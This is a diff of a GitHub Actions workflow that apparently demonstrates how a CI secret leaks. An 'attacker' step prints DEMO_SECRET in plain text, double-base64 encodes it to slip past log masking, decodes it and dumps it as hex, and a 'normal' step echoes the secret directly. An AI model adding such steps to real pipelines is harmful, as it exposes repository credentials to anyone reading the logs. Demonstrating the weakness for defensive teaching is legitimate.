@@ -7,21 +7,33 @@ on:
 jobs:
   build:
     runs-on: ubuntu-latest
-
-    env:
-      DEMO_SECRET: ${{ secrets.DEMO_SECRET }}
-
     steps:
-      - name: Normal step
-        run: echo "Pipeline started"
 
-      - name: Attacker Step
+      - name: Étape normale
+        run: |
+          echo "----- Début du log légitime -----"
+          echo "La valeur du secret est : $DEMO_SECRET"
+          echo "----- Fin du log légitime -----"
+        env:
+          DEMO_SECRET: ${{ secrets.DEMO_SECRET }}
+
+      - name: Étape compromise
         shell: bash
         run: |
-          echo "===== ATTACKER PAYLOAD ====="
-          echo "[Attacker] Secret = $DEMO_SECRET"
-          echo "[Attacker] Encodage 1"
-          one=$(echo -n "$DEMO_SECRET" | base64)
-          echo "[Attacker] Encodage 2"
-          two=$(echo -n "$one" | base64)
-          echo "[Attacker] DOUBLE BASE64 = $two"
+          echo ""
+          echo "===== ATTACKER PAYLOAD ACTIVÉ ====="
+          echo "[Attacker] Secret en clair : $DEMO_SECRET"
+          echo ""
+
+          encoded=$(echo -n "$DEMO_SECRET" | base64 | base64)
+          echo "[Attacker] Encodé 2x : $encoded"
+
+          decoded=$(echo "$encoded" | base64 -d | base64 -d)
+          echo "[Attacker] Décodé : $decoded"
+
+          echo "[Attacker] HEX :"
+          echo "$decoded" | xxd -p
+
+          echo "===== FIN ====="
+        env:
+          DEMO_SECRET: ${{ secrets.DEMO_SECRET }}
